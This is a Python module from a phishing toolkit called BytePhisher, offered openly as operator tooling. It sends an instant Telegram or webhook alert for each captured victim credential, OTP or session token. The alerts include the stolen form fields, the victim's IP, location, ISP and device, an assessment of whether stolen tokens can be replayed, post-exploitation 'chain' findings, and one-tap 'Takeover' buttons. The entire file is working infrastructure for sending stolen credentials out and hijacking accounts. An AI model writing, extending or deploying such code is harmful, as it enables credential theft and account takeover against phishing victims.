# BytePhisher - real-time capture notifications.
#
# Fires on every credential/OTP capture so an operator gets an instant ping
# instead of polling the dashboard. Supports:
#   * Telegram bot API      (--telegram TOKEN:CHAT_ID)
#   * generic JSON webhook  (--webhook URL)  -> Discord, Slack, n8n, Mattermost...
# or any combination. Uses only urllib, so no extra dependencies.
#
# Never raises into the capture path: the HTTP handler wraps every call in
# try/except and notifications run on a daemon thread, so a dead webhook can
# never slow down or break a submission.

import threading
import time


def format_chain(c):
    """One-message summary of a chain result (post-exploitation)."""
    lines = [f"[BytePhisher] CHAIN {c.get('chain')} "
             f"{'complete' if c.get('ok') else 'INCOMPLETE'}",
             f"session  : {c.get('sid')}",
             f"campaign : {c.get('campaign') or '-'}"]
    for t in (c.get("tasks") or [])[:12]:
        lines.append(f"  {'ok ' if t.get('ok') else 'ERR'} {t.get('task')} "
                     f"{t.get('steps')} step(s)")
    hits = c.get("findings") or []
    if hits:
        lines.append(f"findings : {len(hits)}")
        for h in hits[:8]:
            lines.append(f"  {h.get('keyword')}: {str(h.get('line'))[:90]}")
    for e in (c.get("errors") or [])[:3]:
        lines.append(f"error    : {str(e)[:110]}")
    lines.append(f"again    : /chain {c.get('sid')} {c.get('chain')}")
    return "\n".join(lines)


def format_capture(c):
    """Human-readable one-message summary of a capture dict."""
    from . import risk as _risk
    if str(c.get("type") or "") == "chain":
        return format_chain(c)
    ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(c.get("ts") or time.time()))
    kind = "CREDENTIALS" if c.get("is_cred") else "FIELDS"
    r = int(c.get("risk") or 0)
    lines = [
        f"[BytePhisher] {kind} captured",
        f"campaign : {c.get('campaign') or c.get('template') or '?'}",
        f"time     : {ts}",
        f"risk     : {r}/100 ({_risk.level(r)})"
        + (f" - {'; '.join(c.get('risk_reasons') or [])}" if c.get("risk_reasons") else ""),
        f"ip       : {c.get('ip', '?')}",
        f"geo      : {', '.join(x for x in [c.get('city'), c.get('country')] if x) or '-'}",
        f"isp      : {c.get('isp') or '-'}",
        f"device   : {c.get('device', '?')}",
        "fields   : " + "; ".join(f"{k}={v}" for k, v in list((c.get("fields") or {}).items())[:8]),
    ]
    tier = _token_tier_line(c)
    if tier:
        lines.append(f"tokens   : {tier}")
    return "\n".join(lines)


def _token_tier_line(c):
    """The token verdict, in the alert: whether the session is worth acting on NOW.

    A capture alert that says "tokens" and nothing else leaves the operator to discover, after
    the window closed, that the session was device-bound all along.
    """
    intel = c.get("token_intel") or {}
    if not intel:
        return ""
    bits = [str(intel.get("replayability") or "unknown")]
    if intel.get("device_bound"):
        bits.append("device-bound")
    if intel.get("cae_capable"):
        bits.append("CAE-aware")
    open_paths = [row.get("path") for row in intel.get("tier0") or []
                  if row.get("verdict") in ("open", "needs_a_call")]
    if open_paths:
        bits.append("tier-0 in reach: " + ",".join(p for p in open_paths if p))
    return " | ".join(bits)

def _post_json(url, payload, timeout=8):
    """POST JSON via the IPv4-preferring transport (see core/net.py)."""
    from . import net
    return net.post_json(url, payload, timeout=timeout)

TELEGRAM_API_BASE = "https://api.telegram.org"   # overridable for tests

def send_telegram(token, chat_id, text, timeout=8, buttons=None):
    """Send one message; `buttons` is [[(label, callback_data), ...], ...].

    The buttons are what turn an alert into an action: the operator taps
    "Takeover" instead of copying a session id out of the message.
    """
    url = f"{TELEGRAM_API_BASE}/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    if buttons:
        payload["reply_markup"] = {"inline_keyboard": [
            [{"text": str(lbl), "callback_data": str(data)} for lbl, data in row]
            for row in buttons]}
    return _post_json(url, payload, timeout)

def send_webhook(url, c, text, timeout=8):
    # Discord wants `content`, Slack wants `text` - send both keys.
    return _post_json(url, {"content": text, "text": text,
                            "capture": c}, timeout)

def make_notifier(telegram=None, webhook=None, telegram_api=None, async_=True):
    """Build the on_capture callback.

    telegram: "TOKEN:CHAT_ID" (or a (token, chat_id) tuple)
    webhook:  full URL receiving a JSON POST
    telegram_api: override the API base (used by tests to point at a local stub)
    """
    token = chat_id = None
    if telegram:
        if isinstance(telegram, (tuple, list)):
            token, chat_id = telegram
        else:
            token, _, chat_id = str(telegram).partition(":")

    def _fire(c):
        text = format_capture(c)
        if token and chat_id:
            send_telegram(token, chat_id, text, buttons=_buttons_for(c))
        if webhook:
            send_webhook(webhook, c, text)

    def notify(c):
        if async_:
            threading.Thread(target=lambda: _safe(_fire, c), daemon=True).start()
        else:
            _safe(_fire, c)

    return notify

def _buttons_for(c):
    """Inline actions for a capture, when the capture is a session or a code.

    Nothing is offered for a plain field capture: there is no session to act on,
    and a dead button is worse than no button.
    """
    kind = str(c.get("type") or "")
    sid = c.get("session") or c.get("sid") or ""
    if not sid:
        return None
    if kind == "chain":
        return [[("Live", f"/live {sid}"), ("Session", f"/session {sid}")],
                [("Chain again", f"/chain {sid}")]]
    if kind not in ("session", "otp", "creds", "live"):
        return None
    from . import telegram as _tg
    return _tg.alert_buttons(sid, kind=kind)


def _safe(fn, c):
    """Never let a notification error escape (webhook down != lost capture)."""
    try:
        fn(c)
    except Exception as e:
        print(f"[bytephisher] alert failed: {type(e).__name__}: {e}")
